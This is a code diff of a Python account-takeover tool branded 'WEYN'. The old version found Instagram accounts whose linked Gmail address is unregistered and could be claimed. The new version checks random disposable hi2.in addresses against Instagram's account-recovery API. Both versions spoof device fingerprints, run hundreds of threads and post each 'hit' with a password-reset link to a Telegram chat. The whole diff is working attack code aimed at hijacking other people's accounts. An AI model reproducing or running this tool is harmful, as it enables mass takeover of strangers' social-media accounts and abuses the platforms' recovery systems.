@@ -95,7 +95,7 @@ def close_all_sessions():
 def force_stop():
     """Immediately shut down all thread pools and mark state as stopped."""
     _web_state['running'] = False
-    for pool_name in ('_m1_pool', '_m1_lookup_pool', '_m2_disc_pool', '_m2_lookup_pool', '_m3_pool'):
+    for pool_name in ('_m1_pool', '_m1_lookup_pool', '_m2_pool', '_m3_pool'):
         pool = globals().get(pool_name)
         if pool is not None:
             try:
@@ -1211,7 +1211,7 @@ def run_method1_web(token, chat_id, year_choice, min_followers, stop_event):
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  METHOD 2  —  DECDN SCANNER
+#  METHOD 2  —  HI2 ALT
 # ══════════════════════════════════════════════════════════════════════════════
 
 _m2_hits         = 0
@@ -1225,439 +1225,178 @@ _m2_scanned      = 0
 _m2_found_emails: list = []
 _m2_found_lock   = Lock()
 _m2_hit_lock     = Lock()
-_m2_lookup_pool: ThreadPoolExecutor = None
-_m2_disc_pool:   ThreadPoolExecutor = None
+_m2_pool:        ThreadPoolExecutor = None
 _m1_pool:        ThreadPoolExecutor = None
 
-_m2_session  = requests.Session()
-_m2__session = requests.Session()
+# ── Instagram email check (bloks API) ─────────────────────────────────────────
 
-# ── TL token refresher (writes google.txt) ────────────────────────────────────
-
-def _m2_get_tl():
-    """Daemon: refresh Google TL token → google.txt"""
-    while True:
-        try:
-            url = "https://accounts.google.com/_/signup/validatepersonaldetails"
-            params = {
-                'hl': "en-GB",
-                '_reqid': "46000",
-                'rt': "j"
-            }
-            payload = {
-                'continue': "https://accounts.google.com/ManageAccount?nc=1",
-                'f.req': '["AEThLlw3_SjR2r7ZvRrESUg3K4e9eBWmlOC4rULBmw9UAcZVy1db7ezAlKKPXcOeac71VE9Ducrl",null,null,null,null,0,0,"aesowns","aesowns",null,0,null,1,[],1]',
-                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
-                'cookiesDisabled': "false",
-                'deviceinfo': '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
-                'gmscoreversion': "null",
-                'flowName': "GlifWebSignIn",
-                'checkConnection': "youtube:301",
-                'checkedDomains': "youtube",
-                'pstMsg': "1",
-                '': ""
-            }
-            headers = {
-                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
-                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-                'x-same-domain': "1",
-                'google-accounts-xsrf': "1",
-                'sec-ch-ua-mobile': "?1",
-                'sec-ch-ua-platform': '"Android"',
-                'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
-                'origin': "https://accounts.google.com",
-                'x-client-data': "CP/xygE=",
-                'sec-fetch-site': "same-origin",
-                'sec-fetch-mode': "cors",
-                'sec-fetch-dest': "empty",
-                'referer': "https://accounts.google.com/createaccount?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
-                'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-                'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
-            }
-            response = _m2__session.post(url, params=params, data=payload, headers=headers, timeout=20)
-            tl_1 = json.loads(response.text[5:])[0][1][2]
-
-            url = "https://accounts.google.com/_/signup/validatebasicinfo"
-            params = {
-                'hl': "en-GB",
-                'TL': tl_1,
-                '_reqid': "346000",
-                'rt': "j"
-            }
-            payload = {
-                'continue': "https://accounts.google.com/ManageAccount?nc=1",
-                'f.req': '["TL:' + tl_1 + '",2015,4,15,2,null,null,0,null,null,0,0]',
-                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
-                'cookiesDisabled': "false",
-                'deviceinfo': '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
-                'gmscoreversion': "null",
-                'flowName': "GlifWebSignIn",
-                'checkConnection': "youtube:301",
-                'checkedDomains': "youtube",
-                'pstMsg': "1",
-                '': ""
-            }
-            headers['referer'] = "https://accounts.google.com/signup/v2/birthdaygender?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL=" + tl_1
-
-            response = _m2__session.post(url, params=params, data=payload, headers=headers, timeout=20)
-            tl = json.loads(response.text[5:])[0][0][4].split("TL:")[1]
-            with open("google.txt", "w") as w:
-                w.write(tl)
-        except Exception:
-            pass
-
-
-# ── Instagram tokens refresher (writes tokens.txt) ────────────────────────────
-
-def _m2_get_tokens():
-    """Daemon: refresh Instagram CSRF + LSD tokens → tokens.txt"""
-    while True:
-        try:
-            headers = {
-                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
-                'x-ig-app-id': "936619743392459",
-                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
-                'origin': "https://www.instagram.com",
-                'referer': "https://www.instagram.com/",
-            }
-            response = _m2_session.get('https://www.instagram.com/', headers=headers, timeout=20)
-            csrf = response.cookies.get('csrftoken', '')
-            find = re.search(r'"LSD",\[\],{"token":"(.*?)"\}', response.text)
-            lsd = find.group(1) if find else None
-            if csrf and lsd:
-                with open("tokens.txt", "w") as fd:
-                    fd.write(f"{csrf}|{lsd}")
-        except Exception:
-            pass
-
-
-def _m2_load_tokens():
-    try:
-        with open('tokens.txt', 'r') as file:
-            parts = file.read().strip().split("|")
-            if len(parts) == 2:
-                csrf, lsd = parts
-                if csrf and lsd:
-                    return csrf, lsd
-    except Exception:
-        pass
-    return "bKPOnxXALzrHjjhgVUSXUWvsJSheI52L", "9CaKjXH_JGbfD4zZaTfZ8a"
-
-
-# ── Instagram email lookup via bloks API ──────────────────────────────────────
-
-def _m2_lookup(email, token, chat_id, user_data):
-    """Check if email is registered on Instagram. On hit, proceeds to Gmail check."""
-    global _m2_good_insta, _m2_bad_insta, _m2_limit, _m2_scanned
+def _m2_check_instagram_email(email):
     url     = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
     device  = str(uuid.uuid4())
     family  = str(uuid.uuid4())
     android = "android-" + secrets.token_hex(8)
-    uid4_4  = str(uuid.uuid4())
+
+    brands        = ["samsung", "Google", "Xiaomi", "OnePlus", "Nothing", "Realme", "Redmi"]
+    models        = ["SM-G973F", "Pixel 7", "M2102J20SG", "ONEPLUS A6003", "A063"]
+    dpi_values    = ["420", "450", "440"]
+    res_values    = ["1080x2280", "1080x2400", "1440x3088"]
+    android_vers  = ["11", "12", "13", "14"]
+    insta_vers    = [280, 290, 300, 310, 320, 330, 340]
+
+    brand      = random.choice(brands)
+    model      = random.choice(models)
+    dpi_val    = random.choice(dpi_values)
+    res_val    = random.choice(res_values)
+    android_v  = random.choice(android_vers)
+    insta_v    = random.choice(insta_vers)
+    tz_offset  = str(random.choice([60, 330, 480, 570]))
+
+    ua = (f"Instagram {insta_v}.0.0.{random.randint(10,99)} Android "
+          f"({android_v}; {dpi_val}dpi; {res_val}; {brand}; {model}; en_US)")
+
     payload = {
-        'params': (
-            '{"client_input_params":{"aac":"{\\"aac_init_timestamp\\":' + str(int(time.time())) +
-            ',\\"aacjid\\":\\"' + str(uuid.uuid4()) +
-            '\\",\\"aaccs\\":\\"' + secrets.token_urlsafe(32) +
-            '\\"}","flash_call_permissions_status":{"READ_PHONE_STATE":"PERMANENTLY_DENIED","READ_CALL_LOG":"DENIED","ANSWER_PHONE_CALLS":"DENIED"},'
-            '"was_headers_prefill_available":0,"network_bssid":null,"sfdid":"","fetched_email_token_list":{},'
-            '"search_query":"' + email + '","auth_secure_device_id":"","ig_oauth_token":[],"cloud_trust_token":null,'
-            '"was_headers_prefill_used":0,"sso_accounts_auth_data":[],"encrypted_msisdn":"","device_network_info":null,'
-            '"text_input_id":"akyuf0:61","zero_balance_state":null,"android_build_type":"release","accounts_list":[],'
-            '"is_oauth_without_permission":0,"ig_android_qe_device_id":"' + device + '",'
-            '"gms_incoming_call_retriever_eligibility":"client_not_supported","search_screen_type":"email_or_username",'
-            '"is_whatsapp_installed":1,"lois_settings":{"lois_token":""},"ig_vetted_device_nonce":null,'
-            '"headers_infra_flow_id":"","fetched_email_list":[]},'
-            '"server_params":{"event_request_id":"' + str(uuid.uuid4()) + '","is_from_logged_out":0,'
-            '"layered_homepage_experiment_group":null,"device_id":"' + android + '","login_surface":"login_home",'
-            '"waterfall_id":"' + str(uuid.uuid4()) + '","INTERNAL__latency_qpl_instance_id":6.3987980400102E13,'
-            '"is_platform_login":0,"context_data":"","login_entry_point":"logged_out",'
-            '"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"' + family + '",'
-            '"offline_experiment_group":"caa_iteration_v3_perf_ig_4","access_flow_version":"pre_mt_behavior",'
-            '"is_from_logged_in_switcher":0,"qe_device_id":"' + device + '"}}'
-        ),
-        'bk_client_context': '{"bloks_version":"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b","styles_id":"instagram"}',
+        'params': json.dumps({
+            "client_input_params": {
+                "aac": json.dumps({
+                    "aac_init_timestamp": int(time.time()),
+                    "aacjid": str(uuid.uuid4()),
+                    "aaccs": secrets.token_urlsafe(32)
+                }),
+                "flash_call_permissions_status": {
+                    "READ_PHONE_STATE": "PERMANENTLY_DENIED",
+                    "READ_CALL_LOG": "DENIED",
+                    "ANSWER_PHONE_CALLS": "DENIED"
+                },
+                "was_headers_prefill_available": 0,
+                "network_bssid": None,
+                "sfdid": "",
+                "fetched_email_token_list": {},
+                "search_query": email,
+                "auth_secure_device_id": "",
+                "ig_oauth_token": [],
+                "cloud_trust_token": None,
+                "was_headers_prefill_used": 0,
+                "sso_accounts_auth_data": [],
+                "encrypted_msisdn": "",
+                "device_network_info": None,
+                "text_input_id": f"akyuf0:{random.randint(50, 70)}",
+                "zero_balance_state": None,
+                "android_build_type": "release",
+                "accounts_list": [],
+                "is_oauth_without_permission": 0,
+                "ig_android_qe_device_id": device,
+                "gms_incoming_call_retriever_eligibility": "client_not_supported",
+                "search_screen_type": "email_or_username",
+                "is_whatsapp_installed": 1,
+                "lois_settings": {"lois_token": ""},
+                "ig_vetted_device_nonce": None,
+                "headers_infra_flow_id": "",
+                "fetched_email_list": []
+            },
+            "server_params": {
+                "event_request_id": str(uuid.uuid4()),
+                "is_from_logged_out": 0,
+                "layered_homepage_experiment_group": None,
+                "device_id": android,
+                "login_surface": "login_home",
+                "waterfall_id": str(uuid.uuid4()),
+                "INTERNAL__latency_qpl_instance_id": random.uniform(6.3e13, 6.5e13),
+                "is_platform_login": 0,
+                "context_data": "",
+                "login_entry_point": "logged_out",
+                "INTERNAL__latency_qpl_marker_id": 36707139,
+                "family_device_id": family,
+                "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
+                "access_flow_version": "pre_mt_behavior",
+                "is_from_logged_in_switcher": 0,
+                "qe_device_id": device
+            }
+        }),
+        'bk_client_context': json.dumps({
+            "bloks_version": "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
+            "styles_id": "instagram"
+        }),
         'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
     }
-    tz_offset = str(int(datetime.now().astimezone().utcoffset().total_seconds()))
+
     headers = {
-        'User-Agent': random.choice(_M1_USER_AGENTS),
-        'accept-language': "en-IN, en-US",
+        'User-Agent': ua,
+        'accept-language': 'en-IN, en-US',
         'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
-        'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
+        'x-fb-friendly-name': 'IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/',
         'x-ig-android-id': android,
-        'x-ig-app-id': "567067343352427",
-        'x-ig-app-locale': "en_IN",
-        'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
+        'x-ig-app-id': '567067343352427',
+        'x-ig-app-locale': 'en_IN',
         'x-ig-device-id': device,
         'x-ig-family-device-id': family,
         'x-ig-timezone-offset': tz_offset,
         'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
         'x-pigeon-rawclienttime': str(time.time()),
-        'x-pigeon-session-id': f"UFS-{uid4_4}-0",
+        'x-pigeon-session-id': f'UFS-{uuid.uuid4()}-0',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
     }
+
     try:
         response = requests.post(url, data=payload, headers=headers, timeout=20)
-        _m2_scanned += 1
-        _web_state['scanned'] = _m2_scanned
-        if email in response.text:
-            _m2_good_insta += 1
-            _web_state['good'] = _m2_good_insta
-            _m2_check_gmail_and_hit(email, token, chat_id, user_data)
-        elif 'Sorry, something' in response.text:
-            _m2_limit += 1
-            _web_state['limit'] = _m2_limit
-        else:
-            _m2_bad_insta += 1
-            _web_state['bad_insta'] = _m2_bad_insta
+        return email.lower() in response.text.lower()
     except Exception:
-        pass
+        return False
 
 
-# ── Gmail availability check ──────────────────────────────────────────────────
+# ── Worker: generate hi2.in email and check ───────────────────────────────────
 
-def _m2_check_gmail_and_hit(email, token, chat_id, user_data):
-    """Check Gmail username availability. On hit, get masked email and notify."""
-    global _m2_hits, _m2_taken, _m2_bad_email
-    usr = email.split("@")[0]
-    try:
-        with open("google.txt", "r") as ys:
-            tl = ys.read().strip()
-    except Exception:
-        _m2_bad_email += 1
-        _web_state['bad_email'] = _m2_bad_email
-        return
+_M2_CHARS = 'abcdefghijklmnopqrstuvwxyz'
 
-    url = "https://accounts.google.com/_/signup/usernameavailability"
-    params = {
-        'hl': "en-GB",
-        'TL': tl,
-        '_reqid': "446000",
-        'rt': "j"
-    }
-    payload = {
-        'continue': "https://accounts.google.com/ManageAccount?nc=1",
-        'f.req': '["TL:' + tl + '","' + usr + '",0,0,1,null,1,2464]',
-        'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
-        'cookiesDisabled': "false",
-        'deviceinfo': '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
-        'gmscoreversion': "null",
-        'flowName': "GlifWebSignIn",
-        'checkConnection': "youtube:301",
-        'checkedDomains': "youtube",
-        'pstMsg': "1",
-        '': ""
-    }
-    headers = {
-        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'x-same-domain': "1",
-        'google-accounts-xsrf': "1",
-        'sec-ch-ua-mobile': "?1",
-        'sec-ch-ua-platform': '"Android"',
-        'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
-        'origin': "https://accounts.google.com",
-        'x-client-data': "CP/xygE=",
-        'sec-fetch-site': "same-origin",
-        'sec-fetch-mode': "cors",
-        'sec-fetch-dest': "empty",
-        'referer': "https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL=" + tl,
-        'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-        'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
-    }
-    try:
-        response = _m2__session.post(url, params=params, data=payload, headers=headers, timeout=20)
-        if '"gf.uar",1' in response.text:
-            gmail = _m2_get_masked(usr)
-            _m2_bot(token, chat_id, gmail, usr, email, user_data)
-        else:
-            _m2_taken += 1
-            _web_state['taken'] = _m2_taken
-    except Exception:
-        _m2_bad_email += 1
-        _web_state['bad_email'] = _m2_bad_email
+def _m2_gen_prefix():
+    return ''.join(random.choices(_M2_CHARS, k=random.randint(6, 7)))
 
 
-# ── Get masked email from Instagram ──────────────────────────────────────────
-
-def _m2_get_masked(query):
-    url = "https://www.instagram.com/api/graphql"
-    payload = {
-        'av': "0", '__d': "www", '__user': "0", '__a': "1", '__req': "f",
-        '__hs': "20563.HYP:instagram_web_pkg.2.1...0", 'dpr': "3", '__ccg': "GOOD",
-        '__rev': "1037676804", '__s': "nz2w5z:1vm2xs:94sap8",
-        '__hsi': "7630740602831122681",
-        '__dyn': "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwnU6a3a1YwBgao6C0Mo2swlo5q4U2zxe2GewGw9a361qw8Xwn8e87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK10xKi2K7E5y2-1mwa6byohw5ywuU1FU",
-        '__csr': "hcfEI9NcRh48hnvNdsyaD6RnvOldSySDHBpKBLAF6ypAEzC4-ILahjF6S_ui-np4bmqhfR8gCaWFOmjgyiLt9EJ8FeiiGjFeaUO5XyjkBKUhByUGuhddpufW8yZeXx6aCxVxSaz8ycFbxVacxDCx2q8wwG8wHypp9UOawPADz8yaAgO9yVHwiqz89EhwCw05Cuw2eE1ooCU0gByU6IE1gUqU1ao0Vdw2tFnw1ud06Ca0M8fEx2UN7y4bEM3wo1JU2RwSyaOcayU6d7gy0A-9wi6320Ho0N60W8S02VS09vw0lWo",
-        '__hsdp': "gSw8N0I1apBoBrysxGCA9cxkImy-u547Fu1lg13o6u8xy458eQ2Smm50y4FEC2Gce4mE64M09g80n9w6QG09SwjE0iCw5Nw",
-        '__hblp': "05twAU5q0gum1MwuU24xS6FU98Sq0E8e88Uowda0Ek0S9U1hE0igwmuq6rwa608Gw4BwaK0BUhw9SfwXUcE34w2iE4W09iweK2O0jG1rx-8wZwaW0iq3u",
-        '__sjsp': "gSw8N0I1apBoBrysxGCA8yElaxibVUkg9e0mi1Dy8ox1i3J0JBBxg8xaq9wTe",
-        '__comet_req': "7", 'lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8", 'jazoest': "22394",
-        '__spin_r': "1037676804", '__spin_b': "trunk", '__spin_t': "1776670246",
-        '__crn': "comet.igweb.PolarisCAAIGAccountRecoverySearchRoute",
-        'qpl_active_flow_ids': "516759801", 'fb_api_caller_class': "RelayModern",
-        'fb_api_req_friendly_name': "CAAIGAccountSearchViewQuery", 'server_timestamps': "true",
-        'variables': '{"params":{"event_request_id":"7ca5daae-5770-42dd-b77b-0cf23a865a7f","next_uri":"","search_query":"' + query + '","waterfall_id":"553aadae-3ec5-4031-8395-efbabcc670ce"}}',
-        'doc_id': "26178667145161478",
-        'fb_api_analytics_tags': '["qpl_active_flow_ids=516759801"]'
-    }
-    headers = {
-        'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-model': '""', 'x-ig-app-id': "936619743392459",
-        'x-ig-max-touch-points': "5", 'sec-ch-ua-mobile': "?0",
-        'x-fb-friendly-name': "CAAIGAccountSearchViewQuery",
-        'x-fb-lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8", 'sec-ch-ua-platform-version': '""',
-        'x-asbd-id': "359341",
-        'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
-        'sec-ch-prefers-color-scheme': "dark", 'x-csrftoken': "o_6jxh33ZvsQ2eFMyRaM_q",
-        'sec-ch-ua-platform': '"Linux"', 'origin': "https://www.instagram.com",
-        'sec-fetch-site': "same-origin", 'sec-fetch-mode': "cors", 'sec-fetch-dest': "empty",
-        'referer': "https://www.instagram.com/accounts/password/reset/",
-        'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-        'Cookie': "csrftoken=o_6jxh33ZvsQ2eFMyRaM_q; datr=YMnlaTJAraHY5ADdYH8UqsTG; ig_did=2046A480-DF50-4660-A5CD-DC58F57C7A1C; mid=aeXJYAABAAGoDWzGwrGALDqzE3Np; dpr=3.558248996734619; wd=774x749"
-    }
-    try:
-        response = requests.post(url, data=payload, headers=headers, timeout=20)
-        email = next(
-            (i["contact_point"] for i in response.json()["data"]["caa_ar_ig_account_search"]["contact_points"] if i["type"] == "EMAIL"),
-            None
-        )
-        return email
-    except Exception:
-        return None
-
-
-# ── Telegram hit notification ─────────────────────────────────────────────────
-
-def _m2_bot(token, chat_id, gmail, usr, email, user_data):
-    """Record hit, save to file, send Telegram notification."""
-    global _m2_hits, _m2_total
-
-    business   = user_data.get('is_business', None)
-    followers  = user_data.get('follower_count', None)
-    following  = user_data.get('following_count', None)
-    posts      = int(user_data.get('media_count') or 0)
-    full_name  = user_data.get('full_name', None)
-    biography  = user_data.get('biography', None)
-
-    business  = business  if business  is not None else 'None'
-    followers = followers if followers is not None else 'None'
-    following = following if following is not None else 'None'
-    full_name = full_name if full_name is not None else 'None'
-    biography = biography if biography is not None else 'None'
-    mail      = gmail if gmail else 'None'
-    meta      = 'True' if posts > 2 else 'False'
-    domain    = email.split("@")[1] if email and "@" in email else "gmail.com"
-
-    with _m2_hit_lock:
-        _m2_hits  += 1
-        _m2_total += 1
-        hit_num    = _m2_hits
-
-    msg = (
-        f"\n\nWEYN HIGH POST TOOLS AND HIGH FOLLOWERS\n"
-        f"TOTAL HIT : {hit_num}\n"
-        f"META : {meta}\n"
-        f"USERNAME : {usr}\n"
-        f"MAIL: {usr}@{domain}\n"
-        f"RESET  : https://www.instagram.com/accounts/password/reset/\n"
-        f"NAME : {full_name}\n"
-        f"FOLLOWERS : {followers}\n"
-        f"FOLLOWING: {following}\n"
-        f"DATE: [2013-2020]\n"
-        f"POST : {posts}\n"
-        f"LINK : https://www.instagram.com/{usr}\n"
-        f"_______________________________________\n"
-        f"BY ~ @jinbelowg @weyn_vouches"
-    )
-
-    _save_hit_to_file(msg)
-
-    hit_entry = json.dumps({"e": email, "p": posts})
-    with _m2_found_lock:
-        _m2_found_emails.append(hit_entry)
-        if len(_m2_found_emails) > 200:
-            _m2_found_emails.pop(0)
-
-    _web_state['hits']        = _m2_hits
-    _web_state['total']       = _m2_total
-    _web_state['recent_hits'] = list(_m2_found_emails[-20:])
-
-    _send_telegram(token, chat_id, msg)
-
-
-# ── Scanner worker ────────────────────────────────────────────────────────────
-
-_M2_RNDCHARS = 'azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890'
-
-def _m2_get_usernames(token, chat_id, min_followers, stop_event):
-    """Worker: fetch random Instagram user by ID, then run lookup pipeline."""
-    global _m2_total
-    loc_session = _register_session(requests.Session())
+def _m2_worker(token, chat_id, stop_event):
+    global _m2_hits, _m2_good_insta, _m2_bad_insta, _m2_scanned, _m2_total, _m2_found_emails
 
     while not (stop_event and stop_event.is_set()):
         try:
-            rnd        = str(random.randint(2500000000, 21254029834))
-            user_id    = random.randint(2500000000, 21254029834)
-            lsd        = ''.join(random.choice(_M2_RNDCHARS) for _ in range(16))
-            user_agent = (
-                "Instagram 311.0.0.32.118 Android ("
-                + random.choice(["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"])
-                + "; " + str(random.randint(100, 1300)) + "dpi; "
-                + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; "
-                + random.choice(["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE",
-                                  "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"])
-                + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"
-                + str(random.randint(111, 999)) + ")"
-            )
-            headers = {
-                'accept': '*/*',
-                'accept-language': 'en,en-US;q=0.9',
-                'content-type': 'application/x-www-form-urlencoded',
-                'dnt': '1',
-                'origin': 'https://www.instagram.com',
-                'priority': 'u=1, i',
-                'referer': 'https://www.instagram.com/cristiano/following/',
-                'user-agent': user_agent,
-                'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
-                'x-fb-lsd': lsd,
-            }
-            data = {
-                'lsd': lsd,
-                'fb_api_caller_class': 'RelayModern',
-                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
-                'variables': '{"userID":"' + str(user_id) + '","username":"cristiano"}',
-                'server_timestamps': 'true',
-                'doc_id': '7717269488336001',
-            }
-            if stop_event and stop_event.is_set():
-                break
-            resp = loc_session.post(
-                'https://www.instagram.com/api/graphql',
-                headers=headers, data=data, timeout=4
-            )
-            if resp.status_code == 429:
-                time.sleep(1)
-                continue
-            if resp.status_code != 200:
-                time.sleep(0.1)
-                continue
-            user_data = resp.json().get('data', {}).get('user') or {}
-            username  = user_data.get('username')
-            followers = user_data.get('follower_count', 0)
-            pk_id     = user_data.get('pk')
+            email = _m2_gen_prefix() + '@hi2.in'
+            _m2_scanned += 1
+            _web_state['scanned'] = _m2_scanned
 
-            if username and pk_id and followers and followers > max(40, min_followers):
-                email = username + '@gmail.com'
-                _m2_total += 1
-                _web_state['total'] = _m2_total
-                if _m2_lookup_pool is not None:
-                    _m2_lookup_pool.submit(_m2_lookup, email, token, chat_id, user_data)
+            if _m2_check_instagram_email(email):
+                with _m2_hit_lock:
+                    _m2_hits      += 1
+                    _m2_good_insta += 1
+                    _m2_total     += 1
+                    hit_num        = _m2_hits
+
+                msg = (
+                    f"\n\n=============================\n"
+                    f"GOT A HIT  #WEYN\n"
+                    f"=============================\n"
+                    f"TOTAL HITS : {hit_num}\n"
+                    f"EMAIL : {email}\n"
+                    f"=============================\n"
+                    f"BY ~ @jinbelowg @weyn_vouches"
+                )
+
+                _save_hit_to_file(msg)
+
+                hit_entry = json.dumps({"e": email})
+                with _m2_found_lock:
+                    _m2_found_emails.append(hit_entry)
+                    if len(_m2_found_emails) > 200:
+                        _m2_found_emails.pop(0)
+
+                _web_state['hits']        = _m2_hits
+                _web_state['good']        = _m2_good_insta
+                _web_state['total']       = _m2_total
+                _web_state['recent_hits'] = list(_m2_found_emails[-20:])
+
+                _send_telegram(token, chat_id, msg)
+            else:
+                _m2_bad_insta += 1
+                _web_state['bad_insta'] = _m2_bad_insta
 
         except Exception:
-            time.sleep(0.05)
-            continue
+            pass
 
 
 # ── Web entry point ────────────────────────────────────────────────────────────
@@ -1665,7 +1404,7 @@ def _m2_get_usernames(token, chat_id, min_followers, stop_event):
 def run_method2_web(token, chat_id, min_followers, stop_event):
     global _m2_hits, _m2_good_insta, _m2_bad_insta, _m2_bad_email
     global _m2_taken, _m2_limit, _m2_total, _m2_scanned, _m2_found_emails
-    global _m2_lookup_pool
+    global _m2_pool
 
     _m2_hits = _m2_good_insta = _m2_bad_insta = _m2_bad_email = 0
     _m2_taken = _m2_limit = _m2_total = _m2_scanned = 0
@@ -1679,18 +1418,12 @@ def run_method2_web(token, chat_id, min_followers, stop_event):
         'recent_hits': [], 'tg_status': '', 'tg_error': '',
     })
 
-    Thread(target=_m2_get_tl,     daemon=True).start()
-    Thread(target=_m2_get_tokens, daemon=True).start()
-
-    NUM_WORKERS   = 200
-    NUM_LOOKUP    = 30
+    NUM_WORKERS = 500
     try:
-        disc_pool   = ThreadPoolExecutor(max_workers=NUM_WORKERS)
-        lookup_pool = ThreadPoolExecutor(max_workers=NUM_LOOKUP)
-        _m2_disc_pool   = disc_pool
-        _m2_lookup_pool = lookup_pool
+        pool    = ThreadPoolExecutor(max_workers=NUM_WORKERS)
+        _m2_pool = pool
         futures = [
-            disc_pool.submit(_m2_get_usernames, token, chat_id, min_followers, stop_event)
+            pool.submit(_m2_worker, token, chat_id, stop_event)
             for _ in range(NUM_WORKERS)
         ]
         for future in as_completed(futures):
@@ -1699,8 +1432,7 @@ def run_method2_web(token, chat_id, min_followers, stop_event):
             except Exception:
                 pass
     finally:
-        _m2_disc_pool   = None
-        _m2_lookup_pool = None
+        _m2_pool = None
         _web_state['running'] = False
 
 
